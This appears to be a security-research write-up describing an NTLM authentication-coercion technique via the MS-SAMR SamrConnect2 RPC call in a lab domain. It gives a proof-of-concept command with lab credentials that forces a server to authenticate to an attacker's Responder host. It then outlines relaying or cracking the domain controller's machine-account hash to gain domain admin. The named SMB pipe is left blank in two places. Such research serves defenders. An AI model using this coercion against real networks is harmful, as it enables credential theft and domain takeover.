# MS-SAMR - Remote call to SamrConnect2 (opnum 57)

## Summary

+ **Protocol**: [[MS-SAMR]: Security Account Manager (SAM) Remote Protocol (Client-to-Server)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380)

+ **Protocol UUID**: 12345778-1234-abcd-ef00-0123456789ac

+ **Protocol version**: 1.0

+ **SMB Named pipe**: ``

+ **Function name**: [`SamrConnect2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/1076eb2a-4f51-4c5a-a7c7-a78323b06198)

+ **Function operation number**: `57`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-SAMR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380) protocol (with uuid `12345778-1234-abcd-ef00-0123456789ac` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-SAMR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-SAMR]: Security Account Manager (SAM) Remote Protocol (Client-to-Server)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380) and allows to call RPC functions of this protocol. We will then call the remote [`SamrConnect2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/1076eb2a-4f51-4c5a-a7c7-a78323b06198) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
SamrConnect2('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
long SamrConnect2(
   [in, unique, string] PSAMPR_SERVER_NAME ServerName,
   [out] SAMPR_HANDLE* ServerHandle,
   [in] unsigned long DesiredAccess
 );
```

## References

+ Documentation of protocol [MS-SAMR]: Security Account Manager (SAM) Remote Protocol (Client-to-Server): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380

+ Documentation of function `SamrConnect2`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/1076eb2a-4f51-4c5a-a7c7-a78323b06198